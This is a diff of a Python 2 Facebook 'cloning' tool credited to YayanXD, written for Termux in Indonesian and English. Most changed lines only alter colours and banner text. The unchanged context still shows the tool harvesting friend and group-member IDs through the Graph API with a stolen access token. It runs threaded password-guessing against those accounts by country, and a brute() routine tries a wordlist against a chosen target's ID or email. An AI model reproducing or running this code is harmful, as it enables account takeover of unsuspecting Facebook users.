@@ -1674,9 +1674,9 @@ CorrectPassword = "Gans"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;97m🔒 \x1b[1;92mUsername Login \x1b[1;97m»» \x1b[1;97m")
+    username = raw_input("\033[1;97m🔒 \x1b[1;91mUsername Login \x1b[1;97m»» \x1b[1;97m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m🔒 \x1b[1;92mPassword Login \x1b[1;97m»» \x1b[1;97m")
+    	password = raw_input("\033[1;97m🔒 \x1b[1;91mPassword Login  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username #Dev:YayanXD
 	    time.sleep(2)
@@ -1763,9 +1763,9 @@ def login1():
 		print logo13
 		jalan(' \033[1;97mWarning  \033[1;91mGunakan akun Baru Untuk Login' )
 		jalan(' \033[1;97mWarning  \033[1;97mJangan Gunakan Akun Old Untul Login' )
-		jalan(' \033[1;97mSalam    \033[1;94mUser Termux Newbie ' )                 
-		print "\033[1;97m«-----------------\033[1;97mYayanXD\033[1;97m-----------------»"
-		print('\033[1;97m\x1b[1;92m..............LOGIN AKUN FACEBOOK.............\x1b[1;97m' )
+		jalan(' \033[1;91mSalam    \033[1;94mUser Termux Newbie ' )                 
+		print "\033[1;97m«-----------------\033[1;92mYayanXD\033[1;91m-----------------»"
+		print('\033[1;97m\x1b[1;94m..............LOGIN AKUN FACEBOOK.............\x1b[1;97m' )
 		print('	' )
 		id = raw_input('\033[1;97m[] \x1b[1;91mID/Email \x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;97m[] \x1b[1;91mPasswor \x1b[1;91m: \x1b[1;92m')
@@ -1803,12 +1803,12 @@ def login1():
 				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mSepertinya akun Anda Terkena Checkpoint")
+			print("\n\x1b[1;97mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email Salah")
+			print("\n\x1b[1;93mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -1833,14 +1833,14 @@ def menu():
                 sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mSepertinya akun Anda Terkena Checkpoint"
+		print"\033[1;97mSepertinya Akun Anda Terkena Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Tech-Aahil
+	os.system("clear") #Dev:Yayan-XD
         time.sleep(0.05)
 	print logo2
 	print "\033[1;94m«-----------\033[1;91mPERINGATAN!!!\033[1;94m---------------»"
@@ -1952,19 +1952,19 @@ def pilih():
 		os.system('clear')
 		print logo6
 		print "\033[1;94m«-----------------\033[1;91mDataReset\033[1;94m---------------»"
-                jalan('\033[1;91m=10%')
-                jalan("\033[1;92m==20%")
-                jalan('\033[1;93m===30%')
-                jalan('\033[1;94m====40%')
-                jalan("\033[1;95m=====50%")
-                jalan("\033[1;96m======60%")
+                jalan('\033[1;97m=10%')
+                jalan("\033[1;97m==20%")
+                jalan('\033[1;97m===30%')
+                jalan('\033[1;97m====40%')
+                jalan("\033[1;97m=====50%")
+                jalan("\033[1;97m======60%")
                 jalan('\033[1;97m=======70%')
-                jalan('\033[1;91m========80%')
-                jalan('\033[1;92m=========90%')
-                jalan('\033[1;93m==========100%')
-                jalan('\033[1;94mCloning Data Reset')
+                jalan('\033[1;97m========80%')
+                jalan('\033[1;97m=========90%')
+                jalan('\033[1;97m==========100%')
+                jalan('\033[1;97mCloning Data Reset')
 		os.system('git pull origin master')
-		raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
+		raw_input('\n\x1b[1;91m[ \x1b[1;91mKeluar \x1b[1;91m]')
 		menu()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -2066,12 +2066,11 @@ def pilih_crack():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;92mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
+	print "\n\033[1;97m  «-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
         jalan(' \033[1;95m         Start Cloning Pakistan ')
-	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
-	
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"	
 			
 	def main(arg):
 		global cekpoint,sucessful
@@ -2187,11 +2186,11 @@ def pilih_crack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
-	print '\033[1;97mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
-        print '\033[1;97mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
-	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
+	print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
+	print '\033[1;91mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
+        print '\033[1;91mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
+	print"\033[1;95mTotal Live/\x1b[1;91mError \033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;91m/\033[1;97m"+str(len(cekpoint))
 	print """
  ____________________██████
 _________▓▓▓▓____█████████
@@ -2273,7 +2272,7 @@ def pilih_hack():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;95mNama\033[1;94m:\033[1;97m "+op["name"]
+			print"\033[1;91mNama\033[1;94m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;91mID Salah!"
 			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
@@ -2293,12 +2292,12 @@ def pilih_hack():
 	jalan('\033[1;94mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-        print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
+		print("\r\033[1;92mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+        print "\n\033[1;97m  «-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;91m         Start Cloning Indonesia ')
-	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"	
+        jalan(' \033[1;95m         Start Cloning Indonesia ')
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 			
 	def main(arg):
 		global cekpoint,oks
@@ -2417,11 +2416,11 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-        print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
-	print '\033[1;97mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
-        print '\033[1;97mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
-	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
+        print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
+	print '\033[1;91mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
+        print '\033[1;91mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
+	print"\033[1;95mTotal Live/\x1b[1;91mError \033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;91m/\033[1;97m"+str(len(cekpoint))
 	print """
 ┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘
 ┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌┘┌
@@ -2462,7 +2461,7 @@ Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari
                 Facebook
               \033[1;94m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
 
 def black():
@@ -2511,13 +2510,13 @@ def pilih_black():
 		print "\x1b[1;91mSalah Pilih Yang Benar..."
 		pilih_black()
 	
-	print "\033[1;95mTotal ID\033[1;91m: \033[1;97m"+str(len(id))
+	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
 	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
+	print "\n\033[1;97m  «-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
         jalan(' \033[1;95m         Start Cloning United State ')
 	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
@@ -2639,11 +2638,11 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
-	print '\033[1;97mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
-        print '\033[1;97mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
-	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
+	print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
+	print '\033[1;91mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
+        print '\033[1;91mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
+	print"\033[1;95mTotal Live/\x1b[1;91mError \033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;91m/\033[1;97m"+str(len(cekpoint))
 	print """
 
 ……..@*@*
@@ -2673,7 +2672,7 @@ def pilih_black():
                 Facebook
               \033[1;95m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
          
 def mafia():
@@ -2688,9 +2687,9 @@ def mafia():
 		login()
 	os.system('clear')
 	print logo11
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Daftar Teman Publik"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;95mClone Daftar Teman Publik"
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_mafia()
 
 def pilih_mafia():
@@ -2709,7 +2708,7 @@ def pilih_mafia():
 			print"\033[1;95mNama\033[1;91m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;91mID Salah!"
-			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 			mafia()
 		print"\033[1;95mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
@@ -2727,12 +2726,11 @@ def pilih_mafia():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
+	print "\n\033[1;97m  «-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
         jalan(' \033[1;95m         Start Cloning Bangladash ')
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
-	
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"	
 			
 	def main(arg):
 		global cekpoint,oks
@@ -2850,11 +2848,11 @@ def pilih_mafia():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
-	print '\033[1;97mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
-        print '\033[1;97mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
-	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
+	print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
+	print '\033[1;91mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
+        print '\033[1;91mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
+	print"\033[1;95mTotal Live/\x1b[1;91mError \033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;91m/\033[1;97m"+str(len(cekpoint))
 	print """
              
 __¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶___§§§§§______§§§§§___¶¶¶__
@@ -2887,10 +2885,10 @@ _____¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶__________¶¶¶¶¶_______
 Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....YAYAN XD....... \033[1;94m :
+: \033[1;94m .....YAYAN XD....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;94m Moch Yayan Juan Alvredo XD."""
+              \033[1;92m Moch Yayan Juan Alvredo XD."""
 	
 	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
@@ -2909,7 +2907,7 @@ def test():
 	print logo12
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publik"
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;91mKeluar"
 	pilih_test()
 
 def pilih_test():
@@ -2920,17 +2918,17 @@ def pilih_test():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;97m: \033[1;97m")
+		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;91m: \033[1;97m")
 		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;95mNama\033[1;97m:\033[1;97m "+op["name"]
+			print"\033[1;97mNama\033[1;97m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;91mID Salah!"
-			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
+			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 			test()
-		print"\033[1;97m5mMendapatkan ID\033[1;97m..."
+		print"\033[1;95mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -2941,17 +2939,16 @@ def pilih_test():
 		print "\x1b[1;97mSalah Pilih Yang Benar..."
 		pilih_test()
 	
-	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	print "\033[1;95mTotal ID\033[1;91m: \033[1;97m"+str(len(id))
 	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;91m▣\033[1;97m------------------»"
-	jalan(' \033[1;95mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;94m                     Tools by YayanXD')
-	print "\033[1;97m«--------------------\033[1;91m▣\033[1;97m------------------»"
-	
+	print "\n\033[1;97m  «-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
+	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
+        jalan(' \033[1;95m                 tools by YayanXD ')
+	print "\033[1;94m«--------------------\033[1;91m▣\033[1;94m------------------»"
 			
 	def main(arg):
 		global cekpoint,oks
@@ -3069,14 +3066,13 @@ def pilih_test():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
-	print '\033[1;97mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
-        print '\033[1;97mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
-	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
+	print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;92m«---•◈•---Salam User Termux Newbie--•◈•---»" ##Dev:Yayan-XD
+	print '\033[1;91mProses Telah Selesai Press➡ Type 0 Enter↩ Next Type 0 (Keluar)↩\033[1;97m....'
+        print '\033[1;91mNext Type (python2 Silent.py) Selanjutnya login facebook Mulai Kloning\033[1;97m....'
+	print"\033[1;95mTotal Live/\x1b[1;91mError \033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;91m/\033[1;97m"+str(len(cekpoint))
 	print """
              
-
 ________________$$$$__________________$$$$
  _______________$__$$_________________$$__$
  ______________$$___$_________________$___$$
@@ -3109,9 +3105,9 @@ Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari
 : \033[1;94m .....YAYAN XD....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;94m Moch Yayan Juan Alvredo XD."""
+              \033[1;95m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 	crack()
           
 def super():
@@ -3126,7 +3122,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo13
-	print "\033[1;97m-•◈•-\033[1;91m> \033[1;94m1.\x1b[1;93mClone Daftar Teman Publik"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;93mClone Daftar Teman Publik"
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_super()
@@ -3144,7 +3140,7 @@ def pilih_super():
 		try:
 			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
 			hh = json.loads(kk.text)
-			print"\033[1;95mNama\033[1;97m:\033[1;97m "+hh["name"]
+			print"\033[1;95mNama\033[1;91m:\033[1;97m "+hh["name"]
 		except KeyError:
 			print"\x1b[1;91mID Salah!"
 			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
@@ -3160,15 +3156,15 @@ def pilih_super():
 		print "\x1b[1;97mSalah Pilih Yang Benar..."
 		pilih_super()
 	
-	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	print "\033[1;95mTotal ID\033[1;91m: \033[1;97m"+str(len(id))
 	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
-	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;91m         Start Cloning Indian ')
+	jalan(' \033[1;97mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
+        jalan(' \033[1;97m         Start Cloning Indian ')
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
 	
 			
@@ -3318,12 +3314,12 @@ def pilih_super():
 Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....YAYAN XD....... \033[1;97m :
+: \033[1;97m .....YAYAN XD....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;94m Moch Yayan Juan Alvredo XD."""
+              \033[1;97m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 	crack()
 
 def clone_dari_member_group():
@@ -3358,7 +3354,7 @@ def clone_dari_member_group():
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
 	jalan('\033[1;97m[✺] \033[1;97mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mBerhenti Tekan CTRL+z')
+	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
 	print 42*"\033[1;97m="
 	for w in kimak['data']:
 		jml +=1
@@ -3412,13 +3408,13 @@ def brute():
     else:
         os.system('clear')
         print logo14
-        print '\033[1;94m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+        print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
         try:
             email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
             passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type Yayan.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            print '\033[1;94m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+            print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
             print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             time.sleep(0.05)
             print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
@@ -3526,9 +3522,9 @@ def phone():
 		login()
 	os.system('clear')
 	print logo15
-	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publk indian Old."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publk indian Old."
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;971m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_phone()
 
 def pilih_phone():
@@ -3539,17 +3535,17 @@ def pilih_phone():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;91m: \033[1;97m")
-		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		idt = raw_input("\033[1;97m[•◈•] \033[1;97mMasukan ID\033[1;97m: \033[1;97m")
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print"\033[1;97mNama\033[1;97m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;91mID Salah!"
-			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
+			print"\x1b[1;97mID Salah!"
+			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 			phone()
-		print"\033[1;95mMendapatkan ID\033[1;97m..."
+		print"\033[1;97mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -4426,7 +4422,7 @@ def id_friends():
             z = json.loads(r.text)
